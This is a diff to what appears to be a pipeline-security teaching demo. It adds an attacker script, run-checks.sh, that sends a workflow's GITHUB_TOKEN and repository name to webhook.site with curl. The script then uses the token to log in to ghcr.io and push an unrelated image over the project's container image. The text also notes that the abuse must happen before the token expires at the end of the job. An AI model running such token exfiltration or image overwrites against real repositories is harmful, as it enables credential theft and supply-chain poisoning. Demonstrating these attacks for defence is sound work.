@@ -528,15 +528,29 @@ actor=<instructor-username>
 ```
 
 The token `ghs_...` is a live `GITHUB_TOKEN` with `packages: write` on the base repo.
-With it, the attacker could run:
+
+> **Important:** `GITHUB_TOKEN` is ephemeral — GitHub revokes it the moment the workflow
+> run completes. You cannot copy it from webhook.site and reuse it afterwards.
+> Any abuse must happen **inside the same script execution**, before the job exits.
+
+For the demo the attacker therefore puts everything into `run-checks.sh` in one shot:
 
 ```bash
-# Push a backdoored image over the legitimate one
-echo "ghs_xxxx..." | docker login ghcr.io -u <attacker> --password-stdin
-docker pull ubuntu
-docker tag ubuntu ghcr.io/<instructor>/pipeline-security-backend:latest
-docker push ghcr.io/<instructor>/pipeline-security-backend:latest
+#!/usr/bin/env bash
+# Step 1 — prove the token was captured (for the audience)
+curl -s "https://webhook.site/YOUR-UUID" \
+  -d "token=$GITHUB_TOKEN" \
+  -d "repo=$GITHUB_REPOSITORY"
+
+# Step 2 — abuse it immediately, while the run is still active
+echo "$GITHUB_TOKEN" | docker login ghcr.io -u x --password-stdin
+docker pull ubuntu:latest
+docker tag ubuntu:latest ghcr.io/<instructor-username>/pipeline-security-backend:latest
+docker push ghcr.io/<instructor-username>/pipeline-security-backend:latest
 ```
+
+webhook.site provides **visual proof** of capture for the audience — the actual damage
+(overwriting the image) happens in the runner itself during the same job.
 
 ---
 
